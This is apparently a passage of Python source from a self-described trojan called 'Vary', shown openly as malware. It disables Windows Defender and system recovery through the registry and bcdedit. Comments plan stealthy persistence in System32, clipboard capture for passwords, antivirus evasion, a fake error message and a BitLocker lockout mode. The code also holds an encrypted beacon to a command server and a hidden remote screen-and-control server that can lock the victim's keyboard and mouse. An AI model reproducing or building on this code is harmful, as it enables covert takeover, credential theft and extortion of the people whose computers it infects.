        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        programVL2('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" /v ForceUpdateFromMU /t REG_DWORD /d 0 /f')
        programVL2('REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f')
    except Exception as e: # so no crashing
        print(e)
        return False
    
    
def EnableWindowsDefender():
    try: 
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" /v DisablePolicyManager /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControlEnabled /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpyNetReporting /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableSpecialRunningModes /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRoutinelyTakingAction /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 1 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 0 /f')
        programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 0 /f')
    except Exception as e: # so no crashing
        print(e)
        return False

def disableresetoptions():
    programVL2('reagentc.exe /disable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 1 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled no')
    programVL2(r'bcdedit /set {default} bootmenupolicy legacy')
    programVL2('takeown /f ReAgentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\ReAgentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im ReAgentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\ReAgentc.exe" tmpreagentc.exe')

def enableresetoptions():
    programVL2('reagentc.exe /enable')
    programVL2('reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v NoDispBackgroundPage /t REG_DWORD /d 0 /f')
    programVL2(r'bcdedit /set {default} recoveryenabled yes')
    # programVL2(r'bcdedit /set {default} bootmenupolicy legacy')
    programVL2('takeown /f tmpreagentc.exe')
    programVL2('icacls "C:\\Windows\\system32\\tmpreagentc.exe" /grant *S-1-5-32-544:F')
    programVL2('taskkill /f /im tmpreagentc.exe')
    slp(0.5)
    programVL2('ren "C:\\Windows\\system32\\tmpreagentc.exe" ReAgentc.exe')

def add_input_to_shutdown(): # not done, need to make the shutdown handler(function + separate arg) and the get file name too.
    "Why did you need this again? what usage does this serve?"
   # Get the current working directory
    cwd = get_script_directory()

    # Create the shutdown directory if it doesn't exist
    shutdown_dir = 'C:/Shutdown'
    if not os.path.exists(shutdown_dir):
        os.makedirs(shutdown_dir)

    # Create the batch file
    batch_file = os.path.join(shutdown_dir, 'shutdown.bat')
    with open(batch_file, 'w') as f:
        f.write(f'{cwd}/your_file.exe arg1 arg2 arg3')

    # Add the batch file to the windows shutdown schedule
    subprocess.run(['gpedit.msc', '/gp:computer', '/s', '/c', 'Computer Configuration\\Windows Settings\\Scripts (Startup/Shutdown)\\Shutdown\\Properties\\Add', batch_file])

def handle_tostart_sequences():
    # basically here you handle all the starting stuff, adding self to startup, to admin runtime etc.
    self_tostartup()
    # create_presitent_starting()


# in eitgher java or vsc, make a trojan like vary so that as a person runs it, it hides in sys32 in a folder and is added to regedit startup and can run remote commands whilst it sending the ip to a place/server that runs all the time whilst secure.

# make it be as a backdoor. check that hitman and comodo do not detect it whilst either scanning or running, also do not disable firewall or windows defender. make it SILENT AF.
# make it auto send clipboard as well to the server. &19.9.23 why.. i guess for passwords so a toggle.. but i won't be working on it for a while

# Also, make a get prints to phone, so whenever there is a print it'll also show on phone &19.9.23 eh.. for whatever the need is sure already implemented the most part


# THIS IS SILENT VARY, enjoy your stay.

# here you'll see remote connection abusing windows till doom and being lite af.

# silent mode where vary doesn't kill or do anything unless toggeled enabled and saved in settings. convert the base settings when run, so like run an argument before first startup making it not disable task mgr etc etc, but keep(if NEEDED the firewall disabled) the firewall. argument like vary.exe --silent? or something else, also the program HAS to know if it is running firstly or secondly
# Also make a detection for the 2nd program to know if it's in safe mode and auto restart back out. and boot loop if no internet rather than crash or crash, whatever seems to be less obivious, maybe say like, Internal error, connection to kernal32.dll failed, Please check your internet and try again!
# chatgpt "We apologize for the inconvenience caused. It appears that there is an internal error with the connection to the kernal32.dll file. Please check your internet connection and try again."
# if this either reboot or crash, in about like 3 seconds after to make the user be able to read.
# Also make 3 levels of vary, light mode as in silent, medium as in normal, and hard/heavy mode as in computer is completely lock and bitlocker is enabled and whatnot and you cannot acces windows unless a specific passowrd is entered, make it have a separate lock etc.

# &19.9.23, so basically i've done mostly all of the stuff, just instead of it being lite or whatever as in modes, it's in the lightest mode by default, and the user/admin can choose the settings. of course the main person that understands the most will use it

def play_tone_fxphone(information):
    information = information.lower()
    print(repr(f'information is {information}'))
    a = information.split('o1wGI0ks52i40L3'.lower())
    print(a)
    play_tone(int(a[0]), int(a[1]))

def insend(serverip, msg):
    toConnect = NULL
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(3)
        # print(serverip, 'server ip is ')
        if isinstance(serverip, tuple):
            toConnect = serverip
            pass            
        elif ":" in serverip:
            server2, port = serverip.split(':')
            # print(server, port)
            toConnect = (server2, int(port))
        else:
            server2 = serverip
            port = 45433 # old port is 3451
            toConnect = (server2, int(port))
            
            
        client.connect(toConnect)

        TUTKEYPHONE = b'\x12\x1f\xb7\x1b\x7f\xe8W0\xa7\xc7\x04\xad\xc5\x03Q\xa1\x93\xd7\xab3\xe9\xbfE\xcf)=w\xd1\x97N\x9e\xae'

        def encrypt(key, plaintext):
            cipher = AES.new(key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            return (cipher.nonce, tag, ciphertext)

        def decrypt(key, ciphertext):
            (nonce, tag, ciphertext) = ciphertext
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext.decode("utf-8")
            except ValueError:
                return None
            
        message = (encrypt(TUTKEYPHONE, msg.encode("utf-8")))
        message = str(message)
        message = message.encode('utf-8')
        message = bytes(message)
        msg_length = len(message)
        send_length = str(msg_length).encode('utf-8')
        send_length += b' ' * (64 - len(send_length))
        client.send(send_length)
        client.send(message)

        # msg = '!DISCONNECT' # i do not know whether to keep the connection opens and alive, making keepa-alives too is needed, maybe for logging the prints, but why not send each time a packet then keep it up? seems more safe.
        # message = (encrypt(TUTKEYPHONE, msg.encode("utf-8")))
        # message = str(message)
        # message = message.encode('utf-8')
        # message = bytes(message)
        # msg_length = len(message)
        # send_length = str(msg_length).encode('utf-8')
        # send_length += b' ' * (64 - len(send_length))
        # client.send(send_length)
        # client.send(message)

        client.close()
        print(f'Successfully sent {msg}, to client {serverip}')
    except TimeoutError as e:
        if toConnect is not NULL:
            print('Removing timed out connection,', toConnect)
        if isinstance(toConnect, tuple):
            ip, port = toConnect
            if f'{ip}:{port}' in varyhosts:
                varyhosts.remove(f'{ip}:{port}')
        # like there is no else to the isInstance - too messy. and too many handles and errors can be. just void and remove/whatever IGNORE the damn thing
            
    except Exception as e:
        print(f'Error insend(timeout): {e}')


def send(serverip, text): # make two versions of this one that is port defined and one that is port definable, as 192.168.1.2:8080. splitting in ":"
    # try:
        insend(serverip, text)
    # except Exception as e:
        # print(f'Error: {e}')
        

# receive bit



def extract_value(input_str, start_delimiter): # e.g. "X:12 Y:34" it'll extract 12, 34, but in need to specify the start, X:, or Y:, etc
    pattern = re.compile(rf'{re.escape(start_delimiter)}(\d+)(?:\s|$)')
    match = pattern.search(input_str)
    if match:
        return match.group(1)
    return None


# held_keys_sshost = set()  # Track currently held keys





def capture_screen():
    try:
        screenshot = pyautogui.screenshot()
        return np.array(screenshot)
    except Exception as e:
        return create_error_image(str(e))

def create_error_image(error_message):
    img = Image.new('RGB', (800, 600), color='black')
    d = ImageDraw.Draw(img)
    d.text((10, 10), f"Screen grab failed: {error_message}", fill=(255, 255, 255))
    return np.array(img)

def compare_images(img1, img2):
    diff = cv2.absdiff(img1, img2)
    return diff, np.any(diff != 0)

def send_screen_diff(conn, diff, full_image):
    try:
        img = Image.fromarray(diff)
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        
        is_full_image = b'1' if np.array_equal(diff, full_image) else b'0'
        conn.send(is_full_image)
        conn.send(len(img_byte_arr).to_bytes(4, byteorder='big'))
        conn.send(img_byte_arr)
    except Exception as e:
        print(f"Error sending screen diff: {e}")

def process_command(conn, command):
    print(f'Processing: {command}')
    global control_enabled, overwrite_enabled
    try:
        if command == "DISCONNECT":
            raise ConnectionResetError("Client disconnected")
        elif command == "ENABLE_CONTROL":
            control_enabled = True
            print("Control enabled")
        elif command == "DISABLE_CONTROL":
            control_enabled = False
            print("Control disabled")
        elif command == "ENABLE_OVERWRITE":
            overwrite_enabled = True
            print("Overwrite enabled")
        elif command == "DISABLE_OVERWRITE":
            overwrite_enabled = False
            print("Overwrite disabled")
        elif command.startswith("MOUSE"):
            if control_enabled and not (overwrite_enabled and pyautogui.onScreen(*pyautogui.position())):
                parts = command.split(',')
                if len(parts) == 3:
                    _, x, y = parts
                    pyautogui.moveTo(int(x), int(y))
        elif command.startswith("CLICK"):
            if control_enabled and not (overwrite_enabled and pyautogui.onScreen(*pyautogui.position())):
                parts = command.split(',')
                if len(parts) >= 3:
                    _, button, state = parts[:3]
                    if state == "down":
                        pyautogui.mouseDown(button=button)
                    elif state == "up":
                        pyautogui.mouseUp(button=button)
                    else:
                        pyautogui.click(button=button)
        elif command.startswith("KEY"):
            if control_enabled and not overwrite_enabled:
                parts = command.split(',')
                if len(parts) > 1: 
                    keys = parts[1:] 
                    for key in keys:
                        pyautogui.keyDown(key)
                    for key in keys:
                        pyautogui.keyUp(key)
                else:
                    print("No key provided with KEY command")
                    
        elif command == "Disable keyboard":
            print(f"Keyboard disabled")
            disable_keyboard()
        elif command == "Disable mouse":
            disable_mouse()
            print(f"Mouse disabled")
        elif command == "Enable keyboard":
            enable_keyboard()
            print(f"Keyboard enabled")
        elif command == "Enable mouse":
            enable_mouse()
            print(f"Mouse enabled")
        elif command == "PING":
            conn.send(b"PONG")
    except ConnectionResetError as e:
        print(f"Connection closed: {e}")
        return 'close'
        raise 'close'  # Re-raise the exception to be caught in the main loop
        
    except Exception as e:
        print(f"Error processing command: {e}")



def screensharing_server():
    socket.timeout(10000)  # Set a timeout of 5 seconds for socket operations
    host = socket.gethostbyname(socket.gethostname())
    port = 53074

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    server_socket.settimeout(10000)  # Set a timeout of 5 seconds for accept() calls
 
 
    print(f"SS: Listening on {host}:{port}")

    global control_enabled
    control_enabled = False
    global overwrite_enabled
    overwrite_enabled = False

    while True:
        try:
            conn, addr = server_socket.accept()
            print(f"Connected by {addr}")
            conn.send(b"Request accepted")

            screen_size = pyautogui.size()
            conn.send(f"{screen_size.width},{screen_size.height}".encode())

            previous_screen = None

            while True:
                try:
                    ready_to_read, _, _ = select.select([conn], [], [], 0.05)
                    if ready_to_read:
                        data = conn.recv(1024).decode()
                        if not data:
                            raise ConnectionResetError("Client disconnected") 
                        commands = data.split(COMMAND_DELIMITER)
                        for command in commands:
                            if command: 
                                toclose = process_command(conn, command)
                                if toclose == 'close':
                                    raise ConnectionResetError("Client disconnected - gotta close")
                    current_screen = capture_screen()
                    if previous_screen is None:
                        send_screen_diff(conn, current_screen, current_screen)
                    else:
                        diff, has_changes = compare_images(previous_screen, current_screen)
                        if has_changes:
                            send_screen_diff(conn, current_screen, current_screen)
                    
                    previous_screen = current_screen

                except ConnectionResetError as e:
                    print(f"Connection closed: {e}")
                    break
                except Exception as e:
                    print(f"Error in main loop: {e}")
                    traceback.print_exc()
                    if isinstance(e, socket.error):
                        break  # Exit the inner loop if there's a socket error

        except Exception as e:
            print(f"Error in connection handling: {e}")
            traceback.print_exc()

        finally:
            if 'conn' in locals():
                conn.close()

    server_socket.close()

# Host
def host_ss(client_device_ipport):
    """
    Starts a server to host a screen sharing session.
    """
    global running_ss
    running_ss = True
    # perhaps in the future add to only accept from the given client device ip>:port 
    try:
        screensharing_server()  # The main function from the ss_hostv2.py script
    except Exception as e:
        print(f"Fatal error in screen sharing: {e}")
        traceback.print_exc()
    finally:
        running_ss = False




 

# Host
# # Host
# def host_ss(client_device_ipport):
#     """
#     Starts a server to host a screen sharing session.

#     Args:
#         client_device_ipport (tuple): The IP address and port of the client device.

#     Returns:
#         None
        
#     Raises:
#         None
#     """
#     global running_ss
#     mouse = MouseController()
#     keyboard = KeyboardController()

#     image_port = 5000
#     event_port = 5001

#     server_socket_image = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     server_socket_image.bind(('0.0.0.0', image_port))
#     server_socket_image.listen()

#     server_socket_event = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     server_socket_event.bind(('0.0.0.0', event_port))
#     server_socket_event.listen()

#     def send_img(client_socket):
#         while True:
#             img = pyautogui.screenshot()
#             img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
#             img_data = cv2.imencode('.jpg', img)[1].tobytes()
#             length = struct.pack('!I', len(img_data))
#             client_socket.sendall(length)
#             client_socket.sendall(img_data)

#     def receive_events(client_socket):
#         while True:
#             event_type = struct.unpack("!I", client_socket.recv(4))[0]
#             if event_type == 0:  # Mouse press event
#                 x, y, button = struct.unpack("!III", client_socket.recv(12))
#                 if button == 0:
#                     mouse.press(Button.left)
#                 elif button == 1:
#                     mouse.press(Button.right)
#                 elif button == 2:
#                     mouse.press(Button.middle)
#             elif event_type == 1:  # Mouse release event
#                 x, y, button = struct.unpack("!III", client_socket.recv(12))
#                 if button == 0:
#                     mouse.release(Button.left)
#                 elif button == 1:
#                     mouse.release(Button.right)
#                 elif button == 2:
#                     mouse.release(Button.middle)
#             elif event_type == 2:  # Mouse move event
#                 x, y = struct.unpack("!II", client_socket.recv(8))
#                 mouse.position = (x, y)
#             elif event_type == 3:  # Scroll up event
#                 mouse.scroll(0, 1)
#             elif event_type == 4:  # Scroll down event
#                 mouse.scroll(0, -1)
#             elif event_type == 5:  # Key press event
#                 key = struct.unpack("!I", client_socket.recv(4))[0]
#                 keyboard.press(chr(key))
#             elif event_type == 6:  # Key release event
#                 key = struct.unpack("!I", client_socket.recv(4))[0]
#                 keyboard.release(chr(key))

#     print('Opening socket for image transmission...')
#     image_client_socket, _ = server_socket_image.accept()
#     print('Image socket connected')

#     print('Opening socket for event handling...')
#     event_client_socket, _ = server_socket_event.accept()
#     print('Event socket connected')

#     image_thread = Thread(target=send_img, args=(image_client_socket,))
#     event_thread = Thread(target=receive_events, args=(event_client_socket,))

#     image_thread.start()
#     event_thread.start()

#     while running_ss:
#         pass

#     image_thread.join()
#     event_thread.join()

#     print('Closing sockets...')
#     server_socket_image.close()
#     server_socket_event.close()



COMMAND_DELIMITER = ";;"  # Define a command delimiter


def remote_desktop_client(ip_address, port=53074):
    root = tk.Tk()
    client = RemoteDesktopClient(root, ip_address, port)
    root.bind("<Motion>", client.send_mouse_event)
    root.bind("<Button-1>", client.send_click_event)
    root.bind("<Button-2>", client.send_click_event)
    root.bind("<Button-3>", client.send_click_event)
    root.bind("<ButtonRelease-1>", client.send_release_event)
    root.bind("<ButtonRelease-2>", client.send_release_event)
    root.bind("<ButtonRelease-3>", client.send_release_event)
    root.bind("<Key>", client.send_key_event)
    root.mainloop()

class RemoteDesktopClient:
    def __init__(self, master, ip_address, port):
        self.master = master
        self.ip_address = ip_address
        self.port = port
        master.title("Remote Desktop Client")

        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TButton', background='#2a2a2a', foreground='white')
        self.style.configure('TCheckbutton', background='#1e1e1e', foreground='white')
        self.style.configure('TEntry', fieldbackground='#2a2a2a', foreground='white')
        self.style.configure('TScale', background='#1e1e1e', troughcolor='#2a2a2a')

        self.frame = ttk.Frame(master, padding="10")
        self.frame.pack(fill=tk.BOTH, expand=True)

        self.canvas = tk.Canvas(self.frame, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)

        control_frame = ttk.Frame(self.frame)
        control_frame.pack(fill=tk.X, pady=10)

        self.ip_label = ttk.Label(control_frame, text=f"Host IP: {self.ip_address}")
        self.ip_label.pack(side=tk.LEFT, padx=5)

        self.connect_button = ttk.Button(control_frame, text="Connect", command=self.connect)
        self.connect_button.pack(side=tk.LEFT, padx=5)

        self.disconnect_button = ttk.Button(control_frame, text="Disconnect", command=self.disconnect, state=tk.DISABLED)
        self.disconnect_button.pack(side=tk.LEFT, padx=5)

        self.control_var = tk.BooleanVar()
        self.control_checkbox = ttk.Checkbutton(control_frame, text="Enable Control", variable=self.control_var, command=self.toggle_control)
        self.control_checkbox.pack(side=tk.LEFT, padx=5)



        self.scale_var = tk.DoubleVar(value=1.0)
        self.scale_slider = ttk.Scale(control_frame, from_=0.1, to=2.0, orient=tk.HORIZONTAL, variable=self.scale_var, command=self.update_scale)
        self.scale_slider.pack(side=tk.LEFT, padx=5)

        self.scale_label = ttk.Label(control_frame, text="Scale: 1.0x")
        self.scale_label.pack(side=tk.LEFT, padx=5)

        self.control_options = ["Disable keyboard", "Disable mouse", "Enable keyboard", "Enable mouse"]
        self.control_dropdown = ttk.Combobox(control_frame, values=self.control_options, state="readonly")
        self.control_dropdown.pack(side=tk.LEFT, padx=5)
        self.control_dropdown.set(self.control_options[0])

        self.send_event_button = ttk.Button(control_frame, text="Send Event", command=self.send_control_event)
        self.send_event_button.pack(side=tk.LEFT, padx=5)

        self.connection_status_label = ttk.Label(control_frame, text="Connection Status: Disconnected (Ping: N/A)")
        self.connection_status_label.pack(side=tk.RIGHT, padx=5)

        self.socket = None
        self.connected = False
        self.host_screen_size = (0, 0)
        self.scale_factor = 1.0
        self.current_image = None

        self.master.bind("<Configure>", self.on_resize)
        self.last_mouse_position = (0, 0)
        self.mouse_update_interval = 0.05
        self.last_mouse_update_time = 0

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)  # Set a timeout of 5 seconds
        try:
            self.socket.connect((self.ip_address, self.port))
            response = self.socket.recv(1024).decode()
            if response == "Request accepted":
                self.connected = True
                self.connect_button.config(state=tk.DISABLED)
                self.disconnect_button.config(state=tk.NORMAL)
                
                size_data = self.socket.recv(1024).decode().split(',')
                self.host_screen_size = (int(size_data[0]), int(size_data[1]))
                self.update_scale()
                
                self.update_connection_status("Connection Stable")
                receivescreen_thread = threading.Thread(target=self.receive_screen, daemon=True)
                receivescreen_thread.start()
                # threading.Thread(target=self.ping_host, daemon=True).start() # it is causing problems, create a separate socket
        except socket.timeout:
            self.update_connection_status("Connection Failed: Timeout")
            messagebox.showerror("Connection Error", "Connection timed out")
        except Exception as e:
            self.update_connection_status("Connection Failed")
            messagebox.showerror("Connection Error", str(e))

    def disconnect(self):
        if self.connected:
            try:
                self.socket.send(f"DISCONNECT{COMMAND_DELIMITER}".encode())
                self.socket.close()
            except:
                pass
            finally:
                self.connected = False
                self.connect_button.config(state=tk.NORMAL)
                self.disconnect_button.config(state=tk.DISABLED)
                self.update_connection_status("Disconnected")

    def update_connection_status(self, status, ping=None):
        ping_str = f"Ping: {ping:.2f}ms" if ping is not None else "Ping: N/A"
        self.connection_status_label.config(text=f"Connection Status: {status} ({ping_str})")


    def ping_host(self):
        while self.connected:
            try:
                start_time = time.time()
                self.socket.send(f"PING{COMMAND_DELIMITER}".encode())
                self.socket.recv(1024)  # Wait for pong response
                ping = (time.time() - start_time) * 1000  # Convert to milliseconds
                self.update_connection_status("Connection Stable", ping)
            except Exception as e:
                self.update_connection_status("Connection Weak")
            time.sleep(1)  # Ping every second

    def toggle_control(self):
        if self.connected:
            if self.control_var.get():
                self.socket.send(f"ENABLE_CONTROL{COMMAND_DELIMITER}".encode())
            else:
                self.socket.send(f"DISABLE_CONTROL{COMMAND_DELIMITER}".encode())
    def send_control_event(self):
        if self.connected:
            event = self.control_dropdown.get()
            self.socket.send(f"{event}{COMMAND_DELIMITER}".encode())


    def update_scale(self, *args):
        self.scale_factor = self.scale_var.get()
        self.scale_label.config(text=f"Scale: {self.scale_factor:.1f}x")
        self.resize_image()

    def resize_image(self):
        if self.current_image:
            scaled_size = (int(self.host_screen_size[0] * self.scale_factor),
                           int(self.host_screen_size[1] * self.scale_factor))
            resized_image = self.current_image.resize(scaled_size, Image.LANCZOS)
            self.display_image(resized_image)

    def on_resize(self, event=None): 
        if self.current_image:
            self.resize_image()
            self.master.geometry("")  # Auto-resize window

    def receive_screen(self):
        while self.connected:
            try:
                self.socket.settimeout(5) 
                is_full_image = self.socket.recv(1) == b'1'
                size = int.from_bytes(self.socket.recv(4), byteorder='big')

                img_data = b''
                while len(img_data) < size:
                    chunk = self.socket.recv(size - len(img_data))
                    if not chunk:
                        raise RuntimeError("socket connection broken")
                    img_data += chunk
                
                # If using compression on the server:
                # img_data = zlib.decompress(img_data)

                image = Image.open(io.BytesIO(img_data))
                
                self.current_image = image
                self.resize_image()
                self.update_connection_status("Connection Stable")
            except socket.timeout:
                self.update_connection_status("Connection Weak")
            except Exception as e:
                print(f"Error receiving screen: {e}")
                traceback.print_exc()
                self.update_connection_status("Connection Failed")
                self.disconnect()
                break

    def display_image(self, image):
        photo = ImageTk.PhotoImage(image)
        self.canvas.delete("all")
        self.canvas.config(width=image.width, height=image.height)
        self.canvas.create_image(0, 0, anchor=tk.NW, image=photo)
        self.canvas.image = photo

    def send_mouse_event(self, event):
        if self.connected and self.control_var.get():
            current_time = time.time()
            if current_time - self.last_mouse_update_time >= self.mouse_update_interval:
                x = int(event.x / self.scale_factor)
                y = int(event.y / self.scale_factor)
                self.socket.send(f"MOUSE,{x},{y}{COMMAND_DELIMITER}".encode())
                self.last_mouse_update_time = current_time
                self.last_mouse_position = (x, y)

    def send_click_event(self, event):
        if self.connected and self.control_var.get():
            x, y = self.last_mouse_position
            button = "left"
            if event.num == 2:
                button = "middle"
            elif event.num == 3:
                button = "right"
            self.socket.send(f"CLICK,{button},down,{x},{y}{COMMAND_DELIMITER}".encode())

    def send_release_event(self, event):
        if self.connected and self.control_var.get():
            x, y = self.last_mouse_position
            button = "left"
            if event.num == 2:
                button = "middle"
            elif event.num == 3:
                button = "right"
            self.socket.send(f"CLICK,{button},up,{x},{y}{COMMAND_DELIMITER}".encode())

    def send_key_event(self, event):
        if self.connected and self.control_var.get():
            key = event.char
            if not key:
                key = event.keysym 

            key_state = "down" if event.type == '2' else "up" # 2: KeyPress, 3: KeyRelease
            self.socket.send(f"KEY,{key},{key_state}{COMMAND_DELIMITER}".encode())
# Client
def client_ss(ip):
    """
    Connects to the screen sharing server at the specified IP address.
    """
    remote_desktop_client(ip, 53074)

 

# client
# def client_ss(ip):
#     """
#     Initializes a client to establish a socket connection with the specified IP address and port number.
#     The client continuously receives image data from the server and updates the displayed image accordingly.
#     The client also handles mouse and keyboard events and sends them to the server.

#     Parameters:
#     - ip (str): The IP address of the server.

#     Returns:
#     None
#     """
#     socket.setdefaulttimeout(None)
#     enkey = rb'\xe6\xb1\x9c\xa7\x11\xee\x1cK6TZf\xc4%d\xd6b!\xb0\xd5\xb7\xf6M)X\x940~\x10\xd2t~'
#     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     client_socket.connect((ip, 5000))
#     class ImageThread(QThread):
#         changePixmap = pyqtSignal(QImage)

#         def __init__(self, ip, parent=None):
#             super().__init__(parent)
#             self.ip = ip

#         def run(self):
#             try:
#                 while True:
#                     length_data = client_socket.recv(4)
#                     if not length_data:
#                         break
#                     length = int.from_bytes(length_data, byteorder='big')
#                     img_data = b""
#                     while len(img_data) < length:
#                         chunk = client_socket.recv(min(4096, length - len(img_data)))
#                         if not chunk:
#                             break
#                         img_data += chunk

#                     img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
#                     img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
#                     h, w, ch = img.shape
#                     bytesPerLine = ch * w
#                     convertToQtFormat = QImage(img.data, w, h, bytesPerLine, QImage.Format_RGB888)
#                     p = convertToQtFormat.scaled(w, h, Qt.KeepAspectRatio)
#                     self.changePixmap.emit(p)
#             except Exception as e:
#                 print(f"An error occurred: {e}")
#             finally:
#                 client_socket.close()

#         def send_mouse_event(self,event_type ,x ,y ,button ):
#             try:
#                 if button==-1:
#                     message=struct.pack("!I",event_type )+struct.pack("!I",x )+struct.pack("!I",y )+struct.pack("!I",0xFFFFFFFF )
#                 else:
#                     message=struct.pack("!I",event_type )+struct.pack("!I",x )+struct.pack("!I",y )+struct.pack("!I",button )
#                 client_socket.sendall(message )
#             except struct.error as e:
#                 print(f'Erorr at send mouse event, ', e)
#         def send_key_event(self,event_type ,key ):
#             message=struct.pack("!I",event_type )+struct.pack("!I",key )
#             client_socket.sendall(message )

#     class App(QWidget):
#         def __init__(self):
#             super().__init__()
#             self.title="Screenshare test application"
#             self.left=100
#             self.top=100
#             self.width=640
#             self.height=480
#             self.imgis = None
#             self.initUI()

#         def initUI(self):
#             self.setWindowTitle(self.title )
#             self.setGeometry(self.left ,self.top ,self.width ,self.height )
#             layout=QVBoxLayout()
#             self.label=QLabel(self )
#             self.label.setSizePolicy(QSizePolicy.Expanding ,QSizePolicy.Expanding)
#             self.label.setAlignment(Qt.AlignCenter)
#             self.btn=QPushButton("Stop Streaming",self )
#             self.btn.clicked.connect(self.stop_streaming )
            
#             # Add a QCheckBox to the layout
#             self.control_checkbox=QCheckBox("Control",self )
            
#             layout.addWidget(self.label )
#             layout.addWidget(self.btn )
            
#             layout.addWidget(self.control_checkbox)
            
#             self.setLayout(layout )
            
#             # Set the label to accept mouse events
#             self.label.setMouseTracking(True)

#             QApplication.instance().installEventFilter(self)

#             self.show()

#         sys._excepthook=sys.excepthook 
#         def exception_hook(exctype,value ,traceback ):
#             print(exctype,value ,traceback )
#             sys._excepthook(exctype,value ,traceback ) 
#             sys.exit(1) 
#         sys.excepthook=exception_hook 

#         def stop_streaming(self):
#             QApplication.instance().quit()

#         def set_image(self, image):
#             self.imgis = image
#             image = image.scaled(self.label.width(), self.label.height(), Qt.KeepAspectRatio)
#             self.label.setPixmap(QPixmap.fromImage(image))


#         def mousePressEvent(self, event):
#             if self.isActiveWindow() and self.control_checkbox.isChecked():
#                 x_scale = self.imgis.width() / self.label.width()
#                 y_scale = self.imgis.height() / self.label.height()
#                 width = self.imgis.width()
#                 height = self.imgis.height()

#                 # Scale the mouse coordinates
#                 x = int(event.x() * x_scale)
#                 y = int(event.y() * y_scale)

#                 if event.button() == Qt.LeftButton:
#                     tlss.send_mouse_event(0, x, y, 0)
#                 elif event.button() == Qt.RightButton:
#                     tlss.send_mouse_event(0, x, y, 1)
#                 elif event.button() == Qt.MiddleButton:
#                     tlss.send_mouse_event(0, x, y, 2)

#         def mouseReleaseEvent(self, event):
